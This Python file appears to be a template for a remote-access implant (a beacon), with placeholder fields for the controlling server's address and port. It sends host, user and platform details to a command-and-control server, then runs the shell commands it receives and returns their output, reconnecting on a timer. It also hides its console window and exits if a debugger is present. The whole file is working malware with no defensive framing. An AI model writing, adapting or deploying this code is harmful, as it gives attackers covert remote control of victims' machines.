import os as _os
import sys as _sys
import time as _tm
import base64 as _b64
import json as _js
import subprocess as _sp
import socket as _sk
import ssl as _ssl
import random as _rd
import string as _st

# === CONFIGURATION ===
_SERVER_IP = "{ip}"
_SERVER_PORT = {port}
_USE_TLS = {use_tls}
_CHECK_IN_INTERVAL = {interval}
# =====================

def _generate_session_id():
    """Generate unique session ID"""
    _a = _st.ascii_lowercase + _st.digits
    return "-".join("".join(_rd.choices(_a, k=5)) for _ in range(3))

_SESSION_ID = _generate_session_id()

def _get_system_info():
    """Collect basic system information"""
    import platform as _pf
    
    info = {
        "id": _SESSION_ID,
        "host": _sk.gethostname(),
        "user": _os.environ.get("USERNAME", _os.environ.get("USER", "unknown")),
        "cwd": _os.getcwd(),
        "pid": _os.getpid(),
        "arch": _pf.machine(),
        "platform": _pf.system(),
        "version": _pf.version()
    }
    
    # Windows-specific
    if _pf.system() == "Windows":
        info["os"] = "Windows"
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            is_64bit = _sys.maxsize > 2**32
            info["arch"] = "x64" if is_64bit else "x86"
        except:
            pass
    
    return info

def _execute_command(command):
    """Execute shell command - matches listener's expectations"""
    try:
        command = command.strip()
        
        # Handle special commands
        if command.lower() == "exit":
            _sys.exit(0)
        
        if command.lower().startswith("cd "):
            new_dir = command[3:].strip()
            try:
                _os.chdir(_os.path.expandvars(new_dir))
                return f"[+] Changed directory to {_os.getcwd()}"
            except Exception as e:
                return f"[!] Error: {e}"
        
        # Platform-specific execution
        if _os.name == 'nt':  # Windows
            shell_cmd = ["cmd.exe", "/c", command]
            creationflags = 0x08000000  # CREATE_NO_WINDOW
        else:  # Unix-like
            shell_cmd = ["/bin/sh", "-c", command]
            creationflags = 0
        
        # Execute
        proc = _sp.Popen(
            shell_cmd,
            stdout=_sp.PIPE,
            stderr=_sp.PIPE,
            stdin=_sp.DEVNULL,
            creationflags=creationflags
        )
        
        stdout, stderr = proc.communicate()
        output = stdout + stderr
        
        return output.decode('utf-8', errors='ignore').strip()
        
    except SystemExit:
        raise
    except Exception as e:
        return f"[!] Error: {e}"

def _setup_connection():
    """Establish TCP/TLS connection"""
    sock = _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM)
    sock.setsockopt(_sk.SOL_SOCKET, _sk.SO_KEEPALIVE, 1)
    
    if _USE_TLS:
        context = _ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = _ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=_SERVER_IP)
    
    sock.settimeout(30)  # Connection timeout
    sock.connect((_SERVER_IP, _SERVER_PORT))
    sock.settimeout(None)  # Reset to blocking
    
    return sock

def _read_socket_data(sock, timeout=1.0):
    """Read data from socket until timeout"""
    sock.settimeout(timeout)
    data = b""
    
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except _sk.timeout:
        pass
    finally:
        sock.settimeout(None)
    
    return data

def _handle_metadata_collection(sock):
    """Respond to metadata collection commands from listener"""
    try:
        # Wait for first command (usually "uname\n")
        data = _read_socket_data(sock, timeout=2.0)
        
        # Process each line/command
        commands = data.decode('utf-8', errors='ignore').strip().split('\n')
        
        for cmd in commands:
            if not cmd.strip():
                continue
                
            if cmd.strip() == "uname":
                import platform
                result = platform.system()
                sock.sendall((result + "\n").encode())
            
            else:
                # Execute other metadata commands
                result = _execute_command(cmd)
                sock.sendall((result + "\n").encode())
                
    except Exception as e:
        pass

def _main_interactive_loop(sock):
    """Main command loop after metadata collection"""
    buffer = ""
    
    while True:
        try:
            # Receive command
            data = _read_socket_data(sock, timeout=0.5)
            if data:
                buffer += data.decode('utf-8', errors='ignore')
                
                # Process complete commands (ending with newline)
                if '\n' in buffer:
                    commands = buffer.split('\n')
                    # Process all but last (might be incomplete)
                    for cmd in commands[:-1]:
                        if cmd.strip():
                            result = _execute_command(cmd.strip())
                            sock.sendall((result + "\n").encode())
                    
                    # Keep incomplete part in buffer
                    buffer = commands[-1]
            
        except Exception as e:
            break

def _beacon():
    """Main beacon loop"""
    while True:
        try:
            # Connect to C2
            sock = _setup_connection()
            
            # Send session ID (first thing after connection)
            sock.sendall((_SESSION_ID + "\n").encode())
            
            # Handle metadata collection phase
            _handle_metadata_collection(sock)
            
            # Enter interactive command loop
            _main_interactive_loop(sock)
            
            # Clean disconnect
            sock.close()
            
        except (_sk.timeout, ConnectionRefusedError, ConnectionResetError):
            pass
        except KeyboardInterrupt:
            break
        except Exception as e:
            pass
        
        # Wait before reconnecting
        _tm.sleep(_CHECK_IN_INTERVAL)

def _check_debugger():
    """Simple anti-debug check for Windows"""
    if _os.name == 'nt':
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                return False
        except:
            pass
    return True

if __name__ == "__main__":
    # Anti-debug check
    if not _check_debugger():
        _sys.exit(0)
    
    # Main execution
    try:
        _beacon()
    except:
        pass